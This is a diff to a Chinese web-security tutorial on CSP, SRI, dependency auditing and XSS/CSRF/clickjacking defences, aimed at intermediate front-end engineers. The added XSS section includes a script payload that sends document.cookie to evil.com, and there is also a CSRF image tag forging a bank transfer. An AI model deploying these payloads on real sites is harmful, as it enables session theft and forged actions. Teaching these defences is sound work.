@@ -1,10 +1,10 @@
 ---
-title: "Web 安全实战：CSP/SRI/依赖检查 [P5-P6]"
-level: "intermediate"
-tags: ["安全", "CSP", "SRI", "依赖检查", "Helmet"]
-difficulty: "hard"
-updated: "2026-09-10"
-target: "P5-P6 中级工程师"
+title: 'Web 安全实战：CSP/SRI/依赖检查 [P5-P6]'
+level: 'intermediate'
+tags: ['安全', 'CSP', 'SRI', '依赖检查', 'Helmet']
+difficulty: 'hard'
+updated: '2026-09-10'
+target: 'P5-P6 中级工程师'
 ---
 
 # Web 安全实战：CSP/SRI/依赖检查 [P5-P6]
@@ -35,17 +35,106 @@ target: "P5-P6 中级工程师"
 
 ## 底层原理（Why）
 
+### XSS 攻击类型与防范
+
+```
+XSS = 攻击者向页面注入恶意脚本
+
+三种类型：
+
+1. 存储型 XSS（最危险）
+   恶意脚本存储在服务端 → 所有访问者都会执行
+   场景：评论区
+   <script>document.location='http://evil.com/?c='+document.cookie</script>
+
+2. 反射型 XSS
+   恶意脚本在 URL 中 → 用户点击链接时触发
+   场景：搜索关键词
+   https://example.com/search?q=<script>alert(1)</script>
+
+3. DOM 型 XSS
+   前端 JS 直接将不可信数据写入 DOM
+   场景：
+   const html = location.hash.slice(1); // 用户输入
+   document.body.innerHTML = html;       // 直接插入！
+```
+
+```javascript
+// XSS 防范
+// 1. 使用框架的自动转义（Vue/React 默认转义）
+// Vue: <p>{{ userInput }}</p>  // 自动转义 HTML
+// React: <div>{userInput}</div>  // 自动转义
+
+// 2. 避免使用危险 API
+// ❌ 危险
+// element.innerHTML = userInput;
+// element.outerHTML = userInput;
+// document.write(userInput);
+
+// ✅ 安全
+// element.textContent = userInput;
+
+// 3. 使用 DOMPurify 消毒
+import DOMPurify from 'dompurify'
+element.innerHTML = DOMPurify.sanitize(userInput)
+```
+
+### CSRF 攻击原理与防范
+
+```
+CSRF = 攻击者诱导用户在已登录的网站执行操作
+
+攻击流程：
+1. 用户登录 bank.com（Cookie 保存了 session）
+2. 用户访问恶意网站 evil.com
+3. evil.com 自动发起请求：
+   <img src="https://bank.com/transfer?to=hacker&amount=1000">
+4. 浏览器自动携带 bank.com 的 Cookie
+5. 银行以为用户本人操作，执行转账
+
+防范：
+├── CSRF Token（最常用）：服务端生成随机 Token，表单中携带，服务端验证
+├── SameSite Cookie：Strict（完全禁止）/ Lax（GET 允许，默认）/ None（允许，需 Secure）
+├── 验证 Referer/Origin：检查请求来源是否合法
+└── 双重 Cookie：将 Token 存在 Cookie 和请求体中，跨站无法同时获取
+```
+
+### 点击劫持
+
+```
+点击劫持 = 用透明 iframe 覆盖页面，诱导用户点击
+
+防范：
+// 1. X-Frame-Options 响应头
+X-Frame-Options: DENY        // 禁止 iframe
+X-Frame-Options: SAMEORIGIN  // 只允许同源
+
+// 2. CSP frame-ancestors
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+### XSS vs CSRF 对比
+
+```
+┌──────────┬──────────────────┬──────────────────┐
+│          │      XSS         │      CSRF        │
+├──────────┼──────────────────┼──────────────────┤
+│ 攻击目标 │ 用户             │ 网站功能         │
+│ 攻击方式 │ 注入恶意脚本     │ 伪造用户请求     │
+│ Cookie   │ 窃取 Cookie      │ 利用 Cookie      │
+│ 防范核心 │ 转义输入         │ 验证请求来源     │
+└──────────┴──────────────────┴──────────────────┘
+```
+
 ### CSP（Content Security Policy）
 
 ```html
 <!-- 1. HTTP 响应头 -->
-Content-Security-Policy: default-src 'self';
-Content-Security-Policy: script-src 'self' https://cdn.example.com;
-Content-Security-Policy: style-src 'self' 'unsafe-inline';
+Content-Security-Policy: default-src 'self'; Content-Security-Policy: script-src 'self'
+https://cdn.example.com; Content-Security-Policy: style-src 'self' 'unsafe-inline';
 
 <!-- 2. Meta 标签 -->
-<meta http-equiv="Content-Security-Policy" 
-      content="default-src 'self'; script-src 'self'">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'" />
 
 <!-- 3. 常用指令 -->
 <!--
@@ -72,14 +161,16 @@ hash-xxx → 使用 hash
 <!-- 5. nonce 示例 -->
 <!-- 服务端生成随机 nonce -->
 <script nonce="abc123">
-  console.log('允许执行');
+  console.log('允许执行')
 </script>
 
 <!-- CSP 头 -->
 Content-Security-Policy: script-src 'nonce-abc123'
 
 <!-- 6. hash 示例 -->
-<script>console.log('allowed');</script>
+<script>
+  console.log('allowed')
+</script>
 
 <!-- CSP 头 -->
 Content-Security-Policy: script-src 'sha256-xxx'
@@ -109,17 +200,18 @@ Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
 <!-- openssl dgst -sha384 -binary jquery.min.js | openssl base64 -A -->
 
 <!-- 2. 添加 integrity 属性 -->
-<script 
+<script
   src="https://cdn.example.com/jquery.min.js"
   integrity="sha384-xxx"
-  crossorigin="anonymous">
-</script>
+  crossorigin="anonymous"
+></script>
 
-<link 
-  rel="stylesheet" 
+<link
+  rel="stylesheet"
   href="https://cdn.example.com/bootstrap.min.css"
   integrity="sha384-yyy"
-  crossorigin="anonymous">
+  crossorigin="anonymous"
+/>
 
 <!-- 3. 工作原理 -->
 <!--
@@ -250,7 +342,7 @@ add_header Content-Security-Policy "default-src 'self'";
     "audit:fix": "npm audit fix",
     "precommit": "npm audit"
   },
-  
+
   "overrides": {
     "lodash": "4.17.21"
   }
@@ -283,7 +375,7 @@ audit-level=high
 <template>
   <!-- 安全：自动转义 -->
   <p>{{ userInput }}</p>
-  
+
   <!-- 危险：v-html -->
   <div v-html="userInput"></div>
 </template>
@@ -301,20 +393,20 @@ const safeHtml = computed(() => DOMPurify.sanitize(userInput));
 ```javascript
 // React 自动转义
 function Component() {
-  const userInput = '<script>alert(1)</script>';
-  
+  const userInput = '<script>alert(1)</script>'
+
   // 安全：自动转义
-  return <div>{userInput}</div>;
-  
+  return <div>{userInput}</div>
+
   // 危险：dangerouslySetInnerHTML
   // return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
 }
 
 // 使用 DOMPurify
-import DOMPurify from 'dompurify';
+import DOMPurify from 'dompurify'
 
-const safeHtml = DOMPurify.sanitize(userInput);
-return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
+const safeHtml = DOMPurify.sanitize(userInput)
+return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />
 ```
 
 ## 高频面试题
@@ -350,7 +442,7 @@ SRI（Subresource Integrity）：
 └── 不匹配则拒绝加载
 
 使用：
-<script 
+<script
   src="https://cdn.example.com/lib.js"
   integrity="sha384-xxx"
   crossorigin="anonymous">
